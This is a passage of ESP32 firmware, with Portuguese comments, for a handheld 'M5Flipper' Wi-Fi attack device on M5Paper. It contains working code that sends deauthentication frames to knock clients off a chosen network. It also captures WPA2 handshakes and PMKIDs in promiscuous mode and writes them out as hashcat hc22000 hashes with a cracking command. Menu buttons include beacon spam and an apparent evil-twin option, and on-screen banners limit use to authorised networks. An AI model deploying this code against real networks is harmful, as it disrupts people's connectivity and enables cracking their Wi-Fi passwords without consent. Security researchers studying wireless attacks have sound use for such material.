             : "Handshake WPA2  WPA*02*  hashcat -m 22000");
    canvas.drawString(badge, SCR_W/2, y+18);
    canvas.setTextDatum(TL_DATUM);
    y += 44;
    canvas.drawLine(10, y, SCR_W-10, y, C_LGRAY); y += 8;

    auto infoRow = [&](const char *lbl, const char *val) {
      canvas.setTextSize(2); canvas.setTextColor(C_GRAY); canvas.drawString(lbl, 30, y);
      canvas.setTextColor(C_BLACK); canvas.drawString(val, 230, y);
      canvas.drawLine(20, y+28, SCR_W-20, y+28, C_LGRAY); y += 36;
    };

    if (gSdPrev.ssid[0])     infoRow("SSID:",     gSdPrev.ssid);
    if (gSdPrev.bssidStr[0]) infoRow("BSSID AP:", gSdPrev.bssidStr);
    if (gSdPrev.staStr[0])   infoRow("STA MAC:",  gSdPrev.staStr);

    // 16 primeiros hex chars do PMKID/MIC
    char keyShort[20] = {};
    strncpy(keyShort, gSdPrev.keyHex, 16);
    char keyLabel[12]; snprintf(keyLabel, sizeof(keyLabel), "%s:", isPmkid ? "PMKID" : "MIC");
    char keyVal[22];   snprintf(keyVal, sizeof(keyVal), "%s...", keyShort);
    infoRow(keyLabel, keyVal);

    y += 4;
    canvas.setTextSize(1); canvas.setTextColor(C_DGRAY);
    canvas.drawString("Linha hash (truncada):", 30, y); y += 16;
    canvas.fillRect(10, y, SCR_W-20, 34, C_LGRAY);
    char ht[90]; strncpy(ht, gSdPrev.hashLine, 89);
    if (strlen(gSdPrev.hashLine) > 89) { ht[86]='.'; ht[87]='.'; ht[88]='\0'; }
    canvas.setTextColor(C_BLACK); canvas.drawString(ht, 16, y+10); y += 42;

    canvas.setTextSize(1); canvas.setTextColor(C_GRAY); canvas.setTextDatum(MC_DATUM);
    canvas.drawString("Toque em [>> Serial] para imprimir o hash completo no Monitor Serial",
                      SCR_W/2, y+10);
    canvas.setTextDatum(TL_DATUM);

  // ── WiFi Scan CSV — tabela de redes ─────────────────────
  } else if (gSdPrev.ftype == FT_WIFI_SCAN && gSdPrev.scanCount > 0) {
    char st[72];
    snprintf(st, sizeof(st), "%d redes  |  Melhor: %d dBm  (%s)",
             gSdPrev.scanCount, gSdPrev.bestRssi, gSdPrev.bestSsid);
    canvas.setTextSize(2); canvas.setTextColor(C_BLACK); canvas.drawString(st, 20, y); y += 34;
    canvas.drawLine(10, y, SCR_W-10, y, C_LGRAY); y += 8;

    // Cabeçalho da tabela
    canvas.setTextSize(1); canvas.setTextColor(C_DGRAY);
    canvas.drawString("SSID",  20, y); canvas.drawString("BSSID", 330, y);
    canvas.drawString("CH",   528, y); canvas.drawString("AUTH",  580, y);
    canvas.drawString("RSSI", 700, y);
    canvas.drawLine(10, y+14, SCR_W-10, y+14, C_DGRAY); y += 18;

    int rH = 40; int maxR = min(7, (SCR_H - y - 48) / rH);
    for (int r = 0; r < maxR; r++) {
      int li = 1 + gSdPreviewScroll + r; // pula cabeçalho CSV
      if (li >= gSdPrev.lineCount) break;
      int ry = y + r * rH;
      canvas.fillRect(10, ry, SCR_W-26, rH-2, r%2==0 ? C_WHITE : C_LGRAY);
      canvas.setTextSize(1); canvas.setTextColor(C_BLACK);

      char ln[PREV_COL_LEN]; strncpy(ln, gSdPrev.lines[li], PREV_COL_LEN-1); ln[PREV_COL_LEN-1]='\0';
      char *tok = strtok(ln, ",");
      if (tok) {
        String s = String(tok); s.replace("\"","");
        if (s.length() > 20) s = s.substring(0,19)+"~";
        canvas.drawString(s.c_str(), 20, ry+12);
        tok = strtok(nullptr, ","); if (tok) canvas.drawString(tok, 330, ry+12);
        tok = strtok(nullptr, ","); if (tok) canvas.drawString(tok, 530, ry+12);
        tok = strtok(nullptr, ","); if (tok) canvas.drawString(tok, 582, ry+12);
        tok = strtok(nullptr, ","); if (tok) canvas.drawString(tok, 702, ry+12);
      }
    }
    int footY = SCR_H - 44;
    if (gSdPreviewScroll > 0)
      drawBtn(10,  footY, 130, 38, "^ Anterior");
    if (1 + gSdPreviewScroll + maxR < gSdPrev.lineCount)
      drawBtn(150, footY, 130, 38, "v Proximo");

  // ── Fallback: linhas brutas (Clients CSV, Other) ─────────
  } else {
    canvas.setTextSize(1); canvas.setTextColor(C_DGRAY);
    canvas.drawString("Conteudo:", 20, y); y += 18;
    int lH = 26; int maxL = min(PREV_MAX_LINES, (SCR_H - y - 48) / lH);
    for (int i = 0; i < maxL && (i+gSdPreviewScroll) < gSdPrev.lineCount; i++) {
      canvas.setTextColor(i == 0 ? C_DGRAY : C_BLACK);
      char tr[90]; strncpy(tr, gSdPrev.lines[i+gSdPreviewScroll], 89); tr[89]='\0';
      canvas.drawString(tr, 16, y + i * lH);
    }
    int footY = SCR_H - 44;
    if (gSdPreviewScroll > 0)
      drawBtn(10,  footY, 130, 38, "^ Anterior");
    if (gSdPreviewScroll+maxL < gSdPrev.lineCount)
      drawBtn(150, footY, 130, 38, "v Proximo");
  }

  pushQuality();
}

// ════════════════════════════════════════════════════════════
//  Menu Principal  (2 × 2)
// ════════════════════════════════════════════════════════════

#define MBTN_W  440
#define MBTN_H  142   // reduzido para abrir espaço à 3ª linha
#define MBTN_X1  20
#define MBTN_X2 490
#define MBTN_Y1  82
#define MBTN_Y2 232
// 3ª linha — SD Analise (largura total)
#define MBTN_X3  20
#define MBTN_W3 920
#define MBTN_H3  90
#define MBTN_Y3 382

void drawMenu() {
  canvas.fillSprite(C_WHITE);
  drawHeader("M5Flipper");

  drawBtn(MBTN_X1, MBTN_Y1, MBTN_W, MBTN_H, "WiFi Scanner");
  drawBtn(MBTN_X2, MBTN_Y1, MBTN_W, MBTN_H, "Beacon Spam");
  drawBtn(MBTN_X1, MBTN_Y2, MBTN_W, MBTN_H, "Probe Monitor");
  drawBtn(MBTN_X2, MBTN_Y2, MBTN_W, MBTN_H, "System Info");
  drawBtn(MBTN_X3, MBTN_Y3, MBTN_W3, MBTN_H3, "SD Analise");

  canvas.setTextColor(C_LGRAY);
  canvas.setTextSize(1);
  canvas.drawString("M5Paper V1.1  |  ESP32-D0WDQ6-V3  |  M5Flipper v0.2", 30, SCR_H - 18);

  pushQuality();
}

// ════════════════════════════════════════════════════════════
//  WiFi Scanner
// ════════════════════════════════════════════════════════════

void doWifiScan() {
  canvas.fillSprite(C_WHITE);
  drawHeader("WiFi Scanner");
  canvas.setTextColor(C_BLACK); canvas.setTextSize(2);
  canvas.setTextDatum(MC_DATUM);
  canvas.drawString("Escaneando redes WiFi... aguarde", SCR_W/2, SCR_H/2);
  canvas.setTextDatum(TL_DATUM);
  pushFast();

  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(200);

  int n = WiFi.scanNetworks(false, true);
  gAPCount = min(n < 0 ? 0 : n, 30);

  for (int i = 0; i < gAPCount; i++) {
    gAPs[i] = { WiFi.SSID(i), WiFi.BSSIDstr(i),
                WiFi.RSSI(i), (uint8_t)WiFi.channel(i),
                WiFi.encryptionType(i) };
  }
  for (int i = 0; i < gAPCount-1; i++)
    for (int j = 0; j < gAPCount-i-1; j++)
      if (gAPs[j].rssi < gAPs[j+1].rssi) {
        APInfo t = gAPs[j]; gAPs[j] = gAPs[j+1]; gAPs[j+1] = t;
      }

  saveWifiScan();   // grava CSV no SD (silencioso se SD ausente)

  gScrollOff = 0; gSelected = -1; gState = S_WIFI_LIST;
  drawWifiList();
}

void drawWifiList() {
  canvas.fillSprite(C_WHITE);
  drawHeader("WiFi Scanner");
  drawBtn(SCR_W-218, 8, 102, 46, "Scan");
  drawBtn(SCR_W-110, 8, 102, 46, "Menu");

  if (gAPCount == 0) {
    canvas.setTextSize(2); canvas.setTextDatum(MC_DATUM); canvas.setTextColor(C_BLACK);
    canvas.drawString("Nenhuma rede encontrada. Toque em Scan.", SCR_W/2, SCR_H/2);
    canvas.setTextDatum(TL_DATUM); pushQuality(); return;
  }

  int hy = LIST_TOP - 18;
  canvas.setTextSize(1); canvas.setTextColor(C_DGRAY);
  canvas.drawString("SSID",  22,  hy); canvas.drawString("BSSID", 380, hy);
  canvas.drawString("CH",   578,  hy); canvas.drawString("AUTH",  635, hy);
  canvas.drawString("RSSI", 738,  hy); canvas.drawString("SIG",   850, hy);
  canvas.drawLine(10, LIST_TOP-4, SCR_W-16, LIST_TOP-4, C_BLACK);

  for (int i = 0; i < VISIBLE_ROWS; i++) {
    int idx = gScrollOff + i; if (idx >= gAPCount) break;
    int ry = LIST_TOP + i * ROW_H; bool sel = (idx == gSelected);
    canvas.fillRect(10, ry, SCR_W-26, ROW_H-2, sel ? C_BLACK : (i%2==0 ? C_WHITE : C_LGRAY));
    canvas.setTextColor(sel ? C_WHITE : C_BLACK);

    String ssid = gAPs[idx].ssid.isEmpty() ? "[Oculto]" : gAPs[idx].ssid;
    if (ssid.length() > 18) ssid = ssid.substring(0, 17) + "~";
    canvas.setTextSize(2); canvas.drawString(ssid, 22, ry+16);
    canvas.setTextSize(1);
    canvas.drawString(gAPs[idx].bssid,               380, ry+19);
    canvas.drawString(String(gAPs[idx].channel),     580, ry+19);
    canvas.drawString(authLabel(gAPs[idx].auth),     635, ry+19);
    char rs[12]; sprintf(rs, "%d dBm", gAPs[idx].rssi);
    canvas.drawString(rs,                             738, ry+19);
    drawSigBars(850, ry+14, rssiLevel(gAPs[idx].rssi));
  }

  int sbX = SCR_W-12, sbH = VISIBLE_ROWS * ROW_H;
  canvas.drawRect(sbX, LIST_TOP, 4, sbH, C_LGRAY);
  if (gAPCount > VISIBLE_ROWS) {
    int th = sbH * VISIBLE_ROWS / gAPCount;
    int thy = LIST_TOP + sbH * gScrollOff / gAPCount;
    canvas.fillRect(sbX, thy, 4, max(th, 12), C_BLACK);
  }

  int footY = SCR_H - 44;
  char pg[32];
  sprintf(pg, "%d-%d de %d", gScrollOff+1, min(gScrollOff+VISIBLE_ROWS, gAPCount), gAPCount);
  canvas.setTextSize(1); canvas.setTextColor(C_DGRAY);
  canvas.setTextDatum(MC_DATUM); canvas.drawString(pg, SCR_W/2, footY+20);
  if (gSdMsg[0]) {
    canvas.setTextDatum(TR_DATUM);
    canvas.drawString(gSdMsg, SCR_W - 10, footY + 20);
  }
  canvas.setTextDatum(TL_DATUM);
  if (gScrollOff > 0)                          drawBtn(10,  footY, 130, 38, "^ Anterior");
  if (gScrollOff + VISIBLE_ROWS < gAPCount)    drawBtn(150, footY, 130, 38, "v Proximo");
  pushQuality();
}

void drawWifiDetail(int idx) {
  canvas.fillSprite(C_WHITE);
  String hdr = "Rede: "; hdr += gAPs[idx].ssid.isEmpty() ? "[Oculto]" : gAPs[idx].ssid;
  drawHeader(hdr.c_str());
  // 6 botões — layout fixo (left→right, títulos curtos para caber no header)
  drawBtn(312, 8,  96, 46, "Evil");
  drawBtn(416, 8,  96, 46, "Client");
  drawBtn(520, 8,  96, 46, "Beacon");
  drawBtn(624, 8,  96, 46, "PMKID");
  drawBtn(728, 8,  96, 46, "Deauth", true);
  drawBtn(832, 8, 110, 46, "Voltar");

  int y = 85;
  auto row = [&](const char *lbl, const String &val) {
    canvas.setTextSize(2); canvas.setTextColor(C_GRAY); canvas.drawString(lbl, 40, y);
    canvas.setTextColor(C_BLACK); canvas.setTextSize(3); canvas.drawString(val, 290, y-4);
    canvas.drawLine(30, y+42, SCR_W-30, y+42, C_LGRAY); y += 64;
  };

  row("SSID:",      gAPs[idx].ssid.isEmpty() ? "[Oculto]" : gAPs[idx].ssid);
  row("BSSID:",     gAPs[idx].bssid);
  row("Canal:",     String(gAPs[idx].channel));
  row("Seguranca:", authLabel(gAPs[idx].auth));
  char rb[20]; sprintf(rb, "%d dBm", gAPs[idx].rssi); row("RSSI:", rb);
  int lv = rssiLevel(gAPs[idx].rssi);
  const char *q[] = { "Muito Fraco","Fraco","Medio","Bom","Excelente" };
  row("Qualidade:", q[lv]);

  for (int i = 0; i < 4; i++) {
    int bh = 30+i*30, bx = 680+i*52, by = 495-bh;
    if (i < lv) canvas.fillRect(bx, by, 40, bh, C_BLACK);
    else        canvas.drawRect(bx, by, 40, bh, C_LGRAY);
  }
  pushQuality();
}

// ════════════════════════════════════════════════════════════
//  Deauth Attack
// ════════════════════════════════════════════════════════════

void parseBssid(const String &mac, uint8_t *out) {
  sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
         &out[0], &out[1], &out[2], &out[3], &out[4], &out[5]);
}

// ── Saída hc22000 (hashcat) para o Serial ───────────────────
void printHc22000() {
  Serial.println("\n=== WPA2 HANDSHAKE CAPTURADO (hc22000) ===");
  Serial.print("WPA*02*");
  // MIC (16 bytes)
  for (int i = 0; i < 16; i++) Serial.printf("%02x", gHandshake.mic[i]);
  Serial.print("*");
  // BSSID do AP (sem separadores)
  for (int i = 0; i < 6; i++) Serial.printf("%02x", gDeauthTarget.bssid[i]);
  Serial.print("*");
  // MAC do cliente
  for (int i = 0; i < 6; i++) Serial.printf("%02x", gHandshake.clientMac[i]);
  Serial.print("*");
  // ESSID em hex
  for (size_t i = 0; i < strlen(gDeauthTarget.ssid); i++)
    Serial.printf("%02x", (uint8_t)gDeauthTarget.ssid[i]);
  Serial.print("*");
  // ANonce (32 bytes do Frame 1)
  for (int i = 0; i < 32; i++) Serial.printf("%02x", gHandshake.anonce[i]);
  Serial.print("*");
  // EAPOL Frame 2 com MIC zerado (formato hc22000)
  for (int i = 0; i < gHandshake.eapolF2Len; i++) Serial.printf("%02x", gHandshake.eapolF2[i]);
  Serial.println("*01");
  Serial.println("===========================================");
}

// ── Callback promíscuo: captura frames EAPOL da 4-way handshake ─
void deauthCaptureCallback(void *buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_DATA) return;

  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
  uint8_t  *data = pkt->payload;
  uint16_t  len  = pkt->rx_ctrl.sig_len;
  if (len < 30) return;

  uint8_t fc0     = data[0];
  uint8_t fc1     = data[1];
  uint8_t ftype   = (fc0 >> 2) & 0x03;
  uint8_t subtype = (fc0 >> 4) & 0x0F;
  if (ftype   != 0x02) return;   // somente frames de dados
  if (subtype  & 0x04) return;   // descarta null frames (subtype 4 / 12)

  bool    isQoS    = (subtype & 0x08) != 0;
  uint8_t toFromDS = fc1 & 0x03;
  if (toFromDS != 0x01 && toFromDS != 0x02) return; // ignora IBSS/WDS

  // Mapeia posição do BSSID e MAC do cliente conforme ToDS/FromDS
  uint8_t *bssidPtr, *clientPtr;
  if (toFromDS == 0x01) {   // STA → AP
    bssidPtr  = &data[4];   // Addr1 = BSSID
    clientPtr = &data[10];  // Addr2 = SA
  } else {                  // AP → STA
    bssidPtr  = &data[10];  // Addr2 = BSSID
    clientPtr = &data[4];   // Addr1 = DA
  }

  // Filtra apenas tráfego do AP alvo
  if (memcmp(bssidPtr, gDeauthTarget.bssid, 6) != 0) return;

  int hdrLen = 24 + (isQoS ? 2 : 0);
  if (len < (uint16_t)(hdrLen + 12)) return; // LLC(8) + cabeçalho EAPOL(4)

  // Verifica LLC/SNAP:  AA AA 03 00 00 00 88 8E
  uint8_t *llc = &data[hdrLen];
  if (llc[0] != 0xAA || llc[1] != 0xAA || llc[2] != 0x03) return;
  if (llc[6] != 0x88 || llc[7] != 0x8E) return; // EAP over LAN

  uint8_t *eapol = llc + 8;
  if (eapol[1] != 0x03) return; // EAPOL-Key

  uint8_t *ek    = eapol + 4;   // corpo do Key Descriptor
  int      ekLen = (int)len - hdrLen - 12; // bytes após LLC(8) + EAPOL hdr(4)
  if (ekLen < 93) return;        // precisa chegar até MIC (offset 77+16)

  if (ek[0] != 0x02) return;    // RSN Key Descriptor Type

  uint16_t keyInfo = ((uint16_t)ek[1] << 8) | ek[2];
  bool keyAck = (keyInfo & 0x0080) != 0; // bit 7
  bool keyMIC = (keyInfo & 0x0100) != 0; // bit 8

  if (gHandshakeMutex == nullptr) return;
  if (xSemaphoreTake(gHandshakeMutex, 0) != pdTRUE) return;

  if (keyAck && !keyMIC && !gHandshake.hasFrame1) {
    // Frame 1 (AP→STA): extrai ANonce
    memcpy(gHandshake.anonce,     &ek[13], 32);
    memcpy(gHandshake.clientMac, clientPtr,  6);
    gHandshake.hasFrame1 = true;

  } else if (!keyAck && keyMIC && gHandshake.hasFrame1 && !gHandshake.hasFrame2) {
    // Frame 2 (STA→AP): extrai SNonce, MIC e EAPOL raw (MIC zerado para hc22000)
    memcpy(gHandshake.snonce,     &ek[13], 32);
    memcpy(gHandshake.mic,        &ek[77], 16);
    memcpy(gHandshake.clientMac, clientPtr,  6);

    uint16_t eapolBody  = ((uint16_t)eapol[2] << 8) | eapol[3];
    uint16_t eapolTotal = 4 + eapolBody;
    if (eapolTotal > sizeof(gHandshake.eapolF2)) eapolTotal = sizeof(gHandshake.eapolF2);
    memcpy(gHandshake.eapolF2, eapol, eapolTotal);
    // Zera MIC no EAPOL armazenado (offset 4+77=81, 16 bytes) — exigido pelo hc22000
    if (eapolTotal >= 97) memset(&gHandshake.eapolF2[81], 0, 16);
    gHandshake.eapolF2Len = eapolTotal;

    gHandshake.hasFrame2 = true;
    gHandshakeComplete   = true;
  }

  xSemaphoreGive(gHandshakeMutex);
}

void startDeauth(int apIdx) {
  const char *ssid = gAPs[apIdx].ssid.isEmpty() ? "[Oculto]" : gAPs[apIdx].ssid.c_str();
  strncpy(gDeauthTarget.ssid, ssid, 32);
  parseBssid(gAPs[apIdx].bssid, gDeauthTarget.bssid);
  gDeauthTarget.channel = gAPs[apIdx].channel;

  // Preenche SA e BSSID no frame template com o BSSID do AP alvo
  memcpy(&gDeauthFrame[10], gDeauthTarget.bssid, 6);
  memcpy(&gDeauthFrame[16], gDeauthTarget.bssid, 6);

  // Reseta estado do handshake para novo alvo
  memset(&gHandshake, 0, sizeof(gHandshake));
  gHandshakeComplete = false;

  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(deauthCaptureCallback);
  esp_wifi_set_channel(gDeauthTarget.channel, WIFI_SECOND_CHAN_NONE);

  gDeauthPackets   = 0;
  gDeauthRunning   = true;
  gLastDeauthTx    = 0;
  gDeauthStartTime = millis();
}

void resumeDeauth() {
  // Reinicia com o mesmo alvo sem precisar do índice do AP
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(deauthCaptureCallback);
  esp_wifi_set_channel(gDeauthTarget.channel, WIFI_SECOND_CHAN_NONE);
  gDeauthRunning   = true;
  gLastDeauthTx    = 0;
  gDeauthStartTime = millis();
}

void stopDeauth() {
  gDeauthRunning = false;
  esp_wifi_set_promiscuous_rx_cb(nullptr);
  esp_wifi_set_promiscuous(false);
}

// ════════════════════════════════════════════════════════════
//  PMKID Capture
// ════════════════════════════════════════════════════════════

// Callback promíscuo: procura PMKID no Key Data do EAPOL Frame 1
// PMKID KDE: DD 14 00 0F AC 04 [16 bytes PMKID]
void pmkidCallback(void *buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_DATA || gPmkidFound) return;

  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
  uint8_t  *data = pkt->payload;
  uint16_t  len  = pkt->rx_ctrl.sig_len;
  if (len < 30) return;

  uint8_t fc0     = data[0], fc1 = data[1];
  uint8_t ftype   = (fc0 >> 2) & 0x03;
  uint8_t subtype = (fc0 >> 4) & 0x0F;
  if (ftype != 0x02)  return;
  if (subtype & 0x04) return;  // null frames

  bool    isQoS    = (subtype & 0x08) != 0;
  uint8_t toFromDS = fc1 & 0x03;
  if (toFromDS != 0x01 && toFromDS != 0x02) return;

  uint8_t *bssidPtr = (toFromDS == 0x01) ? &data[4]  : &data[10];
  uint8_t *staPtr   = (toFromDS == 0x01) ? &data[10] : &data[4];

  if (memcmp(bssidPtr, gDeauthTarget.bssid, 6) != 0) return;

  int hdrLen = 24 + (isQoS ? 2 : 0);
  if (len < (uint16_t)(hdrLen + 12)) return;

  uint8_t *llc = &data[hdrLen];
  if (llc[0] != 0xAA || llc[1] != 0xAA || llc[2] != 0x03) return;
  if (llc[6] != 0x88 || llc[7] != 0x8E) return;

  uint8_t *eapol = llc + 8;
  if (eapol[1] != 0x03) return;  // EAPOL-Key

  uint8_t *ek    = eapol + 4;
  int      ekLen = (int)len - hdrLen - 12;
  if (ekLen < 95) return;        // precisa chegar ao campo Key Data Length
  if (ek[0] != 0x02) return;    // RSN Key Descriptor

  uint16_t keyInfo = ((uint16_t)ek[1] << 8) | ek[2];
  bool keyAck = (keyInfo & 0x0080) != 0;
  bool keyMIC = (keyInfo & 0x0100) != 0;

  // Apenas Frame 1 (AP → STA): ACK=1, MIC=0
  if (!keyAck || keyMIC) return;

  // Parse Key Data em busca do KDE PMKID (DD 14 00 0F AC 04 + 16 bytes)
  uint16_t kdLen = ((uint16_t)ek[93] << 8) | ek[94];
  if (kdLen == 0 || kdLen > 512) return;
  if (ekLen < 95 + (int)kdLen) return;

  uint8_t *kd = &ek[95];
  int j = 0;
  while (j + 2 <= (int)kdLen) {
    uint8_t kdeType = kd[j];
    uint8_t kdeSize = kd[j + 1];          // bytes depois do campo Length
    if (j + 2 + (int)kdeSize > (int)kdLen) break;

    if (kdeType == 0xDD && kdeSize == 0x14 &&
        kd[j+2] == 0x00 && kd[j+3] == 0x0F && kd[j+4] == 0xAC && kd[j+5] == 0x04) {
      // PMKID encontrado
      if (gPmkidMutex && xSemaphoreTake(gPmkidMutex, 0) == pdTRUE) {
        memcpy(gPmkid.pmkid, &kd[j + 6], 16);
        memcpy(gPmkid.apMac,  bssidPtr, 6);
        memcpy(gPmkid.staMac, staPtr,   6);
        gPmkidFound = true;
        xSemaphoreGive(gPmkidMutex);
      }
      return;
    }
    j += 2 + kdeSize;
    if (kdeSize == 0) break;
  }
}

// ── Serial output hc22000 para PMKID ─────────────────────────
void printPmkid() {
  Serial.println("\n=== PMKID CAPTURADO (hc22000) ===");
  // Formato: WPA*01*PMKID*AP_MAC*STA_MAC*ESSID_HEX***
  Serial.print("WPA*01*");
  for (int i = 0; i < 16; i++) Serial.printf("%02x", gPmkid.pmkid[i]);
  Serial.print("*");
  for (int i = 0; i < 6;  i++) Serial.printf("%02x", gPmkid.apMac[i]);
  Serial.print("*");
  for (int i = 0; i < 6;  i++) Serial.printf("%02x", gPmkid.staMac[i]);
  Serial.print("*");
  for (size_t i = 0; i < strlen(gDeauthTarget.ssid); i++)
    Serial.printf("%02x", (uint8_t)gDeauthTarget.ssid[i]);
  Serial.println("***");
  Serial.println("==================================");
}

// ── Grava PMKID no SD em formato hc22000 ─────────────────────
void savePmkid() {
  if (!gSdReady) return;
  char ts[20]; rtcTimestamp(ts, sizeof(ts));
  char filename[48];
  snprintf(filename, sizeof(filename), "/pmkid_%s.hc22000", ts);

  File f = SD.open(filename, FILE_WRITE);
  if (!f) { Serial.println("[SD] Erro ao criar ficheiro PMKID."); return; }

  f.printf("# M5Flipper — PMKID Capture\n");
  f.printf("# SSID : %s\n", gDeauthTarget.ssid);
  f.printf("# BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
           gDeauthTarget.bssid[0], gDeauthTarget.bssid[1], gDeauthTarget.bssid[2],
           gDeauthTarget.bssid[3], gDeauthTarget.bssid[4], gDeauthTarget.bssid[5]);
  f.printf("# hashcat -m 22000 %s wordlist.txt\n", filename);

  f.print("WPA*01*");
  for (int i = 0; i < 16; i++) f.printf("%02x", gPmkid.pmkid[i]);
  f.print("*");
  for (int i = 0; i < 6;  i++) f.printf("%02x", gPmkid.apMac[i]);
  f.print("*");
  for (int i = 0; i < 6;  i++) f.printf("%02x", gPmkid.staMac[i]);
  f.print("*");
  for (size_t i = 0; i < strlen(gDeauthTarget.ssid); i++)
    f.printf("%02x", (uint8_t)gDeauthTarget.ssid[i]);
  f.println("***");
  f.close();

  snprintf(gSdMsg, sizeof(gSdMsg), "SD: %s", filename);
  Serial.printf("[SD] PMKID salvo em %s\n", filename);
}

// ── Inicia captura PMKID ──────────────────────────────────────
void startPmkid(int apIdx) {
  const char *ssid = gAPs[apIdx].ssid.isEmpty() ? "[Oculto]" : gAPs[apIdx].ssid.c_str();
  strncpy(gDeauthTarget.ssid, ssid, 32);
  parseBssid(gAPs[apIdx].bssid, gDeauthTarget.bssid);
  gDeauthTarget.channel = gAPs[apIdx].channel;

  memset(&gPmkid, 0, sizeof(gPmkid));
  gPmkidFound   = false;
  gSdMsg[0]     = '\0';

  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(pmkidCallback);
  esp_wifi_set_channel(gDeauthTarget.channel, WIFI_SECOND_CHAN_NONE);

  // Envia burst de deauth para forçar re-associação (→ handshake → EAPOL F1)
  memcpy(&gDeauthFrame[10], gDeauthTarget.bssid, 6);
  memcpy(&gDeauthFrame[16], gDeauthTarget.bssid, 6);
  for (int i = 0; i < 8; i++) {
    esp_wifi_80211_tx(WIFI_IF_STA, gDeauthFrame, sizeof(gDeauthFrame), false);
    delay(5);
  }

  gPmkidRunning   = true;
  gPmkidStartTime = millis();
}

void stopPmkid() {
  gPmkidRunning = false;
  esp_wifi_set_promiscuous_rx_cb(nullptr);
  esp_wifi_set_promiscuous(false);
}

// ── Ecrã de PMKID Capture ────────────────────────────────────
void drawPmkid() {
  canvas.fillSprite(C_WHITE);
  drawHeader("PMKID Capture");

  drawBtn(SCR_W-218, 8, 102, 46, gPmkidRunning ? "Parar" : "Iniciar", gPmkidRunning);
  drawBtn(SCR_W-110, 8, 102, 46, "Voltar");

  // Banner legal
  canvas.fillRect(10, 70, SCR_W-20, 36, C_DGRAY);
  canvas.setTextColor(C_WHITE); canvas.setTextSize(1);
  canvas.setTextDatum(MC_DATUM);
  canvas.drawString("USE APENAS EM REDES PROPRIAS OU COM AUTORIZACAO EXPLICITA DO RESPONSAVEL",
                    SCR_W/2, 88);
  canvas.setTextDatum(TL_DATUM);

  // Info do alvo
  int y = 125;
  auto row = [&](const char *lbl, const String &val) {
    canvas.setTextSize(2); canvas.setTextColor(C_GRAY); canvas.drawString(lbl, 40, y);
    canvas.setTextColor(C_BLACK); canvas.setTextSize(3); canvas.drawString(val, 260, y-4);
    canvas.drawLine(30, y+40, SCR_W-30, y+40, C_LGRAY); y += 58;
  };

  char bssidStr[18];
  sprintf(bssidStr, "%02X:%02X:%02X:%02X:%02X:%02X",
          gDeauthTarget.bssid[0], gDeauthTarget.bssid[1], gDeauthTarget.bssid[2],
          gDeauthTarget.bssid[3], gDeauthTarget.bssid[4], gDeauthTarget.bssid[5]);

  row("Alvo:",  String(gDeauthTarget.ssid));
  row("BSSID:", bssidStr);
  row("Canal:", String(gDeauthTarget.channel));
  row("Auth:",  String(authLabel(gAPs[gSelected].auth)));

  // Área de status (y ≈ 357)
  canvas.setTextDatum(MC_DATUM);

  if (gPmkidFound) {
    // Banner de captura
    canvas.fillRect(10, y+8, SCR_W-20, 48, C_BLACK);
    canvas.setTextSize(2); canvas.setTextColor(C_WHITE);
    canvas.drawString("PMKID CAPTURADO!", SCR_W/2, y+32);

    // PMKID hex — duas linhas de 16 hex chars cada
    char hex[33] = {};
    for (int i = 0; i < 16; i++) sprintf(&hex[i*2], "%02x", gPmkid.pmkid[i]);
    canvas.setTextSize(2); canvas.setTextColor(C_BLACK);
    char l1[17] = {}, l2[17] = {};
    memcpy(l1, hex,    16); memcpy(l2, hex+16, 16);
    canvas.drawString(l1, SCR_W/2, y+78);
    canvas.drawString(l2, SCR_W/2, y+104);

    // Ficheiro SD
    if (gSdMsg[0]) {
      canvas.setTextSize(1); canvas.setTextColor(C_DGRAY);
      canvas.drawString(gSdMsg, SCR_W/2, y+130);
    }
  } else if (gPmkidRunning) {
    uint32_t elapsed = (millis() - gPmkidStartTime) / 1000;
    char st[56];
    sprintf(st, "Aguardando EAPOL Frame 1 ...  %lu s", elapsed);
    canvas.setTextSize(2); canvas.setTextColor(C_BLACK);
    canvas.drawString(st, SCR_W/2, y+28);

    // Animação de espera (ponto rotativo)
    static const char *spin[] = { "|", "/", "—", "\\" };
    canvas.setTextSize(3); canvas.setTextColor(C_LGRAY);
    canvas.drawString(spin[(millis()/400) % 4], SCR_W/2, y+72);
  } else {
    canvas.setTextSize(2); canvas.setTextColor(C_BLACK);
    canvas.drawString(gPmkidFound ? "Capturado." : "Pronto. Toque em Iniciar.", SCR_W/2, y+28);
  }

  canvas.setTextDatum(TL_DATUM);

  // Nota técnica no rodapé
  canvas.setTextSize(1); canvas.setTextColor(C_GRAY);
  canvas.setTextDatum(MC_DATUM);
  canvas.drawString("PMKID: HMAC-SHA1-128(PMK, \"PMK Name\" || AP_MAC || STA_MAC)  — hc22000 WPA*01*",
                    SCR_W/2, SCR_H-16);
  canvas.setTextDatum(TL_DATUM);

  pushFast();
}

void drawDeauth() {
  canvas.fillSprite(C_WHITE);
  drawHeader("Deauth Attack");

  drawBtn(SCR_W - 218, 8, 102, 46, gDeauthRunning ? "Parar" : "Iniciar", gDeauthRunning);
  drawBtn(SCR_W - 110, 8, 102, 46, "Voltar");

  // Banner de aviso legal
  canvas.fillRect(10, 70, SCR_W - 20, 36, C_DGRAY);
  canvas.setTextColor(C_WHITE); canvas.setTextSize(1);
  canvas.setTextDatum(MC_DATUM);
  canvas.drawString("USE APENAS EM REDES PROPRIAS OU COM AUTORIZACAO EXPLICITA DO RESPONSAVEL",
                    SCR_W / 2, 88);
  canvas.setTextDatum(TL_DATUM);

  // Informações do alvo
  int y = 125;
  auto row = [&](const char *lbl, const String &val) {
    canvas.setTextSize(2); canvas.setTextColor(C_GRAY);
    canvas.drawString(lbl, 40, y);
    canvas.setTextColor(C_BLACK); canvas.setTextSize(3);
    canvas.drawString(val, 260, y - 4);
